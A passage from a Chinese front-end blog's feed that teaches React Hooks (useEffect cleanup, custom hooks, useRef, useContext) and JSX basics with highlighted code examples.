class="keyword">const</span> handleResize = <span class="function"><span class="params">()</span> =&gt;</span> &#123;&#125;;</span><br><span class="line">  <span class="built_in">window</span>.addEventListener(<span class="string">'resize'</span>, handleResize);</span><br><span class="line">&#125;, []);</span><br></pre></td></tr></table></figure><p><strong>注意：</strong></p><ul><li>跟 useState Hook 一样，一个组件中也可以调用 useEffect Hook 多次</li><li>推荐：<strong>一个 useEffect 只处理一个功能，有多个功能时，使用多次 useEffect</strong></li></ul><h2 id="useEffect-清除副作用"><a href="#useEffect-清除副作用" class="headerlink" title="useEffect-清除副作用"></a>useEffect-清除副作用</h2><ul><li>effect 的<strong>返回值</strong>是可选的，可省略。也可以返回一个<strong>清理函数</strong>，用来执行事件解绑等清理操作</li><li>清理函数的执行时机：<ul><li><strong>清理函数</strong>会在组件卸载时以及下一次副作用回调函数调用的时候执行，用于清除上一次的副作用。</li><li>如果依赖项为空数组，那么会在组件卸载时会执行。相当于组件的<code>componetWillUnmount</code></li></ul></li></ul><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">useEffect(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> handleResize = <span class="function"><span class="params">()</span> =&gt;</span> &#123;&#125;;</span><br><span class="line">  <span class="built_in">window</span>.addEventListener(<span class="string">'resize'</span>, handleResize);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 这个返回的函数，会在该组件卸载时来执行</span></span><br><span class="line">  <span class="comment">// 因此，可以去执行一些清理操作，比如，解绑 window 的事件、清理定时器 等</span></span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="params">()</span> =&gt;</span> <span class="built_in">window</span>.removeEventListener(<span class="string">'resize'</span>, handleResize);</span><br><span class="line">&#125;, []);</span><br></pre></td></tr></table></figure><h2 id="useEffect-使用总结"><a href="#useEffect-使用总结" class="headerlink" title="useEffect-使用总结"></a>useEffect-使用总结</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1</span></span><br><span class="line"><span class="comment">// 触发时机：1 第一次渲染会执行 2 每次组件重新渲染都会再次执行</span></span><br><span class="line"><span class="comment">// componentDidMount + ComponentDidUpdate</span></span><br><span class="line">useEffect(<span class="function"><span class="params">()</span> =&gt;</span> &#123;&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2（使用频率最高）</span></span><br><span class="line"><span class="comment">// 触发时机：只在组件第一次渲染时执行</span></span><br><span class="line"><span class="comment">// componentDidMount</span></span><br><span class="line">useEffect(<span class="function"><span class="params">()</span> =&gt;</span> &#123;&#125;, []);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3（使用频率最高）</span></span><br><span class="line"><span class="comment">// 触发时机：1 第一次渲染会执行 2 当 count 变化时会再次执行</span></span><br><span class="line"><span class="comment">// componentDidMount + componentDidUpdate（判断 count 有没有改变）</span></span><br><span class="line">useEffect(<span class="function"><span class="params">()</span> =&gt;</span> &#123;&#125;, [count]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4</span></span><br><span class="line">useEffect(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// 返回值函数的执行时机：组件卸载时</span></span><br><span class="line">  <span class="comment">// 在返回的函数中，清理工作</span></span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 相当于 componentWillUnmount</span></span><br><span class="line">  &#125;;</span><br><span class="line">&#125;, []);</span><br><span class="line"></span><br><span class="line">useEffect(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// 返回值函数的执行时机：1 组件卸载时 2 count 变化时</span></span><br><span class="line">  <span class="comment">// 在返回的函数中，清理工作</span></span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="params">()</span> =&gt;</span> &#123;&#125;;</span><br><span class="line">&#125;, [count]);</span><br></pre></td></tr></table></figure><h1 id="Hooks进阶"><a href="#Hooks进阶" class="headerlink" title="Hooks进阶"></a>Hooks进阶</h1><h3 id="自定义hook"><a href="#自定义hook" class="headerlink" title="自定义hook"></a>自定义hook</h3><ul><li>函数需要是 <code>use</code> 开头，否则react不认为是 <code>hooks</code></li><li>自定义 <code>hook</code> 就是对状态和逻辑的封装，将来可以复用</li></ul><p>例：</p><ul><li>在App.js组件实现一个记录鼠标移动坐标的功能</li><li>把实现功能的逻辑和状态封装在一个函数中</li><li>将函数放在一个单独的js文件中，导入给App.js使用</li></ul><p><strong>未封装前</strong></p><p><code>App.js</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; useState, useEffect &#125; <span class="keyword">from</span> <span class="string">"react"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> App = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> [mouse, setMouse] = useState(&#123; <span class="attr">x</span>: <span class="number">0</span>, <span class="attr">y</span>: <span class="number">0</span> &#125;)</span><br><span class="line">  useEffect(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> handelMouseMove = <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">      setMouse(&#123; <span class="attr">x</span>: e.pageX, <span class="attr">y</span>: e.pageY &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">document</span>.addEventListener(<span class="string">'mousemove'</span>, handelMouseMove)</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="built_in">document</span>.removeEventListener(<span class="string">'mousemove'</span>, handelMouseMove)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;, [])</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">"app"</span>&gt;</span>根组件 &#123;JSON.stringify(mouse)&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> App</span><br></pre></td></tr></table></figure><p><strong>封装hooks之后</strong></p><p><code>hook.js</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; useState, useEffect &#125; <span class="keyword">from</span> <span class="string">"react"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> useMouse = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> [mouse, setMouse] = useState(&#123; <span class="attr">x</span>: <span class="number">0</span>, <span class="attr">y</span>: <span class="number">0</span> &#125;)</span><br><span class="line">  useEffect(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> handelMouseMove = <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">      setMouse(&#123; <span class="attr">x</span>: e.pageX, <span class="attr">y</span>: e.pageY &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">document</span>.addEventListener(<span class="string">'mousemove'</span>, handelMouseMove)</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="built_in">document</span>.removeEventListener(<span class="string">'mousemove'</span>, handelMouseMove)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;, [])</span><br><span class="line">  <span class="keyword">return</span> mouse</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>App.js</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; useMouse &#125; <span class="keyword">from</span> <span class="string">"./hooks"</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> App = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> mouse = useMouse()</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">"app"</span>&gt;</span>根组件 &#123;JSON.stringify(mouse)&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> App</span><br></pre></td></tr></table></figure><h3 id="useRef-基本使用"><a href="#useRef-基本使用" class="headerlink" title="useRef-基本使用"></a>useRef-基本使用</h3><blockquote><p>使用<code>useRef</code>可以获取dom元素，组件也可以通过它获取。</p></blockquote><ul><li>导入 <code>useRef</code> 函数从 <code>react</code> 中</li><li>创建ref对象 <code>const ref = useRef(null)</code></li><li>给需要获取的标签上 <code>ref={ref}</code> 绑定ref对象</li><li>渲染完毕后，可以通过 <code>ref.current</code> 获取dom元素</li></ul><p>例：组件初始化自动获取焦点功能</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; useRef, useEffect &#125; <span class="keyword">from</span> <span class="string">"react"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> App = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> inputRef = useRef(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">  useEffect(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// input DOM元素</span></span><br><span class="line">    <span class="built_in">console</span>.log(inputRef.current); </span><br><span class="line">    <span class="comment">// input 获取焦点</span></span><br><span class="line">    inputRef.current.focus()</span><br><span class="line">  &#125;, []);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;div className=<span class="string">"app"</span>&gt;</span><br><span class="line">      根组件：</span><br><span class="line">      &lt;input type=<span class="string">"text"</span> ref=&#123;inputRef&#125; /&gt;</span><br><span class="line">    &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">  );</span></span><br><span class="line"><span class="regexp">&#125;;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">export default App;</span></span><br></pre></td></tr></table></figure><h3 id="useContext-基本使用"><a href="#useContext-基本使用" class="headerlink" title="useContext-基本使用"></a>useContext-基本使用</h3><p><strong>大致步骤：</strong></p><ul><li>通过 <code>createContext</code> 创建context对象</li><li>通过 <code>Provider</code> 组件包裹根组件，注入数据</li><li>在 <code>后代</code> 组件中使用 <code>useContext</code> 使用数据</li></ul><ol><li><p>通过 <code>createContext</code> 创建context对象</p><p><code>context.js</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; createContext &#125; <span class="keyword">from</span> <span class="string">"react"</span>;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> createContext(&#123;&#125;)</span><br></pre></td></tr></table></figure></li><li><p>通过 <code>Provider</code> 组件包裹根组件，注入数据</p><p><code>App.jsx</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; useState &#125; <span class="keyword">from</span> <span class="string">"react"</span>;</span><br><span class="line"><span class="keyword">import</span> Context <span class="keyword">from</span> <span class="string">"./context"</span>;</span><br><span class="line"><span class="keyword">import</span> Child <span class="keyword">from</span> <span class="string">'./Child'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> App = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> [count, setCount] = useState(<span class="number">0</span>)</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;Context.Provider value=&#123;count&#125;&gt;</span><br><span class="line">      &lt;div className=<span class="string">"app"</span>&gt;</span><br><span class="line">        根组件：&#123;count&#125; &lt;button onClick=&#123;() =&gt; setCount(count + <span class="number">1</span>)&#125;&gt;打豆豆&lt;<span class="regexp">/button&gt;</span></span><br><span class="line"><span class="regexp">        &lt;hr /</span>&gt;</span><br><span class="line">        &lt;Child /&gt;</span><br><span class="line">      &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">    &lt;/</span>Context.Provider&gt;</span><br><span class="line">  );</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> App;</span><br></pre></td></tr></table></figure></li><li><p>在 <code>后代</code> 组件中使用 <code>useContext</code> 使用数据</p><p><code>Child.jsx</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; useContext &#125; <span class="keyword">from</span> <span class="string">"react"</span></span><br><span class="line"><span class="keyword">import</span> Context <span class="keyword">from</span> <span class="string">'./context'</span></span><br><span class="line"><span class="keyword">const</span> Child = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> count = useContext(Context)</span><br><span class="line">  <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>后代组件：&#123;count&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> Child</span><br></pre></td></tr></table></figure></li></ol><p><strong>总结：</strong></p><ul><li>创建context对象和<code>Provider</code>注入数据和之前一样，使用数据只需要 <code>useContext</code> 即可。</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Hooks-介绍&quot;&gt;&lt;a href=&quot;#Hooks-介绍&quot; class=&quot;headerlink&quot; title=&quot;Hooks-介绍&quot;&gt;&lt;/a&gt;Hooks-介绍&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;hooks 解释&lt;ul&gt;
&lt;li&gt;&lt;code&gt;Hooks&lt;/code&gt;：钩子、钓
      
    
    </summary>
    
      <category term="前端" scheme="//www.shen.ee/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
      <category term="hooks" scheme="//www.shen.ee/tags/hooks/"/>
    
      <category term="reacthooks" scheme="//www.shen.ee/tags/reacthooks/"/>
    
      <category term="useState" scheme="//www.shen.ee/tags/useState/"/>
    
      <category term="useEffect" scheme="//www.shen.ee/tags/useEffect/"/>
    
      <category term="useRef" scheme="//www.shen.ee/tags/useRef/"/>
    
      <category term="useContext" scheme="//www.shen.ee/tags/useContext/"/>
    
  </entry>
  
  <entry>
    <title>JSX语法学习</title>
    <link href="//www.shen.ee/article/34118.html"/>
    <id>//www.shen.ee/article/34118.html</id>
    <published>2022-06-15T02:38:39.000Z</published>
    <updated>2022-06-22T06:24:25.995Z</updated>
    
    <content type="html"><![CDATA[<h2 id="JSX-基本概念"><a href="#JSX-基本概念" class="headerlink" title="JSX 基本概念"></a>JSX 基本概念</h2><blockquote><p><code>JSX</code> 是 <code>JavaScript XML</code> 的简写，表示了在 JavaScript 中书写 XML 格式的代码。它是 <code>React</code> 的核心内容，它可以让我们在 <code>React</code> 中创建元素更加简单，更加直观，提高开发效率。</p></blockquote><ul><li>什么是JSX？<ul><li><code>JS</code> 扩展语法，可以在 <code>JS</code> 中书写 <code>XML</code> 语法</li></ul></li><li>JSX的优点？<ul><li>可以更加 <code>简洁、直观、高效</code> 的声明 UI 界面</li></ul></li></ul><h3 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h3><p>我们可以在 babel 的网站，在线测试 <a href="https://www.babeljs.cn/" target="_blank" rel="noopener">babeljs</a> ，这个网站可以把 <code>JSX</code> 代码转换成 <code>JS</code> 代码 </p><p><img src="https://oss.iyouhun.com/img/md/image-20220607171437890.png" alt="image-20220607171437890"></p><p><strong>注意</strong>：<code>JSX</code> 是 <code>JavaScript</code> 的<strong>语法扩展</strong>，它无法在浏览器中直接使用，在 <code>create-react-app</code> 脚手架中内置了 <code>@babel/plugin-transform-react-jsx</code> 插件来解析它，成为 <code>JavaScript</code> 的标准语法。</p><h2 id="JSX-基本使用"><a href="#JSX-基本使用" class="headerlink" title="JSX 基本使用"></a>JSX 基本使用</h2><ul><li>导入 <code>react-dom</code></li><li>使用 <code>JSX</code> 创建元素</li><li>使用 <code>react-dom</code> 渲染</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ReactDom <span class="keyword">from</span> <span class="string">'react-dom'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> element = (</span><br><span class="line">  &lt;div id=<span class="string">"box"</span>&gt;</span><br><span class="line">    &lt;h1&gt;JSX&lt;<span class="regexp">/h1&gt;</span></span><br><span class="line"><span class="regexp">    &lt;ul&gt;</span></span><br><span class="line"><span class="regexp">      &lt;li&gt;tom&lt;/</span>li&gt;</span><br><span class="line">      &lt;li&gt;jack&lt;<span class="regexp">/li&gt;</span></span><br><span class="line"><span class="regexp">      &lt;li&gt;tony&lt;/</span>li&gt;</span><br><span class="line">    &lt;<span class="regexp">/ul&gt;</span></span><br><span class="line"><span class="regexp">  &lt;/</span>div&gt;</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">ReactDom.render(element, <span class="built_in">document</span>.getElementById(<span class="string">'root'</span>));</span><br></pre></td></tr></table></figure><p>上述代码运行成功，现在 <strong><code>React17x</code></strong> 可以不必导入<code>React</code>包，因为在 <code>babel</code> 转换的时候自动导入了创建 React 元素的依赖。但是如果你使用 <strong><code>React16x</code></strong> 那么你还需要手动导入 <strong><code>React</code></strong> ，如何验证？安装下低版本的 <code>React</code> 包即可。</p><p><strong>总结</strong></p><ul><li>导入 <code>react-dom</code> 使用 <code>JSX</code> 创建元素 使用 <code>react-dom</code> 渲染元素</li><li><code>17x</code> 版本的 <code>React</code> 不需要导入，如果将来遇见 <code>低版本</code> 是需要导入的。</li></ul><p><strong>补充</strong></p><ul><li><code>vscode settings.json</code> 加上 在 react 中使用 ement 语法提示创建标签</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"emmet.includeLanguages"</span>: &#123;</span><br><span class="line">    <span class="string">"javascript"</span>: <span class="string">"javascriptreact"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="JSX-的注意事项"><a href="#JSX-的注意事项" class="headerlink" title="JSX 的注意事项"></a>JSX 的注意事项</h2><h3 id="使用细节"><a href="#使用细节" class="headerlink" title="使用细节"></a>使用细节</h3><ul><li>特殊属性写法 <strong><code>className</code> <code>htmlFor</code></strong></li><li>没有内容的节点可以使用 <code>单标签</code></li><li>必需有根节点，可以使用 <code>&lt;&gt;&lt;/&gt;</code> 幽灵标签，其实是 <code>&lt;React.Fragment&gt;&lt;/React.Fragment&gt;</code> 简写</li><li>如果 <code>JSX</code> 有换行，最好使用 <code>()</code> 包裹</li></ul><h3 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h3><ul><li>特殊属性</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// class ---&gt; className    for ---&gt; htmlFor  特殊属性</span></span><br><span class="line">&lt;div className=<span class="string">"box"</span>&gt;</span><br><span class="line">  &lt;label htmlFor=<span class="string">"ck"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">label</span>&gt;</span></span></span><br><span class="line">  &lt;input id=<span class="string">"ck"</span> type=<span class="string">"checkbox"</span> /&gt;</span><br><span class="line">&lt;<span class="regexp">/div&gt;</span></span><br></pre></td></tr></table></figure><ul><li>可单标签</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// &lt;span className="icon-edit"&gt;&lt;/span&gt; 没内容可以写成单标签形势</span></span><br><span class="line">&lt;span className=<span class="string">"icon-edit"</span> /&gt;</span><br></pre></td></tr></table></figure><ul><li>有根节点</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 使用 React.Fragment 代码片段</span></span><br><span class="line"><span class="keyword">import</span> React <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"><span class="keyword">import</span> ReactDom <span class="keyword">from</span> <span class="string">'react-dom'</span>;</span><br><span class="line"><span class="keyword">const</span> element = (</span><br><span class="line">  &lt;React.Fragment&gt;</span><br><span class="line">    &lt;div&gt;header&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">    &lt;div&gt;footer&lt;/</span>div&gt;</span><br><span class="line">  &lt;<span class="regexp">/React.Fragment&gt;</span></span><br><span class="line"><span class="regexp">);</span></span><br><span class="line"><span class="regexp">ReactDom.render(element, document.getElementById('root'));</span></span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 2. 使用&lt;&gt;&lt;/&gt;可以避免没必要的标签产生 简写 React.Fragment</span></span><br><span class="line"><span class="keyword">import</span> ReactDom <span class="keyword">from</span> <span class="string">'react-dom'</span>;</span><br><span class="line"><span class="keyword">const</span> element = (</span><br><span class="line">  &lt;&gt;</span><br><span class="line">    &lt;div&gt;header&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">    &lt;div&gt;footer&lt;/</span>div&gt;</span><br><span class="line">  &lt;<span class="regexp">/&gt;</span></span><br><span class="line"><span class="regexp">);</span></span><br><span class="line"><span class="regexp">ReactDom.render(element, document.getElementById('root'));</span></span><br></pre></td></tr></table></figure><ul><li>用小括号</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 有换行的时候最好使用()可以让标签对其，避免没必要的错误</span></span><br><span class="line"><span class="keyword">const</span> element = (</span><br><span class="line">  &lt;&gt;</span><br><span class="line">    &lt;div&gt;header&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">    &lt;div&gt;footer&lt;/</span>div&gt;</span><br><span class="line">  &lt;<span class="regexp">/&gt;</span></span><br><span class="line"><span class="regexp">);</span></span><br></pre></td></tr></table></figure><h2 id="JSX-嵌入表达式"><a href="#JSX-嵌入表达式" class="headerlink" title="JSX 嵌入表达式"></a>JSX 嵌入表达式</h2><p>在<strong><code>JSX</code></strong>中使用<strong>{ }</strong>嵌入<code>JS</code>表达式，注意不能使用语句。</p><ul><li>展示数据</li><li>进行运算</li><li>三元运算</li><li>使用函数</li><li>使用 JSX</li><li>使用注释</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> React <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"><span class="keyword">import</span> ReactDom <span class="keyword">from</span> <span class="string">'react-dom'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 数据</span></span><br><span class="line"><span class="keyword">const</span> data = &#123;</span><br><span class="line">  name: <span class="string">'tom'</span>,</span><br><span class="line">  age: <span class="number">18</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数</span></span><br><span class="line"><span class="keyword">const</span> up = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> data.name.toUpperCase();</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// jsx表达式</span></span><br><span class="line"><span class="keyword">const</span> list = (</span><br><span class="line">  &lt;ul&gt;</span><br><span class="line">    &lt;li&gt;jack&lt;<span class="regexp">/li&gt;</span></span><br><span class="line"><span class="regexp">    &lt;li&gt;tony&lt;/</span>li&gt;</span><br><span class="line">  &lt;<span class="regexp">/ul&gt;</span></span><br><span class="line"><span class="regexp">);</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">const element = (</span></span><br><span class="line"><span class="regexp">  &lt;div&gt;</span></span><br><span class="line"><span class="regexp">    &#123;/</span>* <span class="number">1.</span> 使用数据  注释推荐快键键(ctrl+<span class="regexp">/)  */</span>&#125;</span><br><span class="line">    &lt;div&gt;姓名：&#123;data.name&#125;&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">    &lt;div&gt;年龄：&#123;data.age&#125;&lt;/</span>div&gt;</span><br><span class="line">    &#123;<span class="comment">/* 2. 使用运算 */</span>&#125;</span><br><span class="line">    &lt;div&gt;明年几岁：&#123;data.age + <span class="number">1</span>&#125;&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">    &#123;/</span>* <span class="number">3.</span> 使用三元 *<span class="regexp">/&#125;</span></span><br><span class="line"><span class="regexp">    